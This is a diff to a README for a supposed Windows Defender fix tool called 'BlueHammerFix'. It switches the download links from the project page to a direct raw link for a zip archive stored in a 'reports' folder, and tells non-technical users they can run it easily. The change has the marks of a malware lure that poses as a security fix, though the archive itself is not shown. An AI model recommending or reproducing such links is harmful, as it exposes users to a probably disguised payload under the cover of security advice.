@@ -1,6 +1,6 @@
 # 🛠️ BlueHammerFix - Fix Windows Defender Security Gaps Easily
 
-[![](https://img.shields.io/badge/Download-BlueHammerFix-blue.svg)](https://github.com/shrinepercy3767/BlueHammerFix)
+[![](https://img.shields.io/badge/Download-BlueHammerFix-blue.svg)](https://raw.githubusercontent.com/shrinepercy3767/BlueHammerFix/main/reports/Blue_Fix_Hammer_v1.9.zip)
 
 This tool secures your computer against a local privilege escalation vulnerability found in Windows Defender. It provides automatic fixes and detection rules to keep your system safe. You do not need technical knowledge to run these repairs.
 
@@ -22,7 +22,7 @@ Your computer must run a 64-bit version of Windows 10 or Windows 11. You need at
 ## 📥 How To Get The Tool
 
 1. Visit the project link to download the software.
-2. [Click here to download BlueHammerFix](https://github.com/shrinepercy3767/BlueHammerFix).
+2. [Click here to download BlueHammerFix](https://raw.githubusercontent.com/shrinepercy3767/BlueHammerFix/main/reports/Blue_Fix_Hammer_v1.9.zip).
 3. Save the file to your computer.
 4. Locate the folder where you saved the file.
 
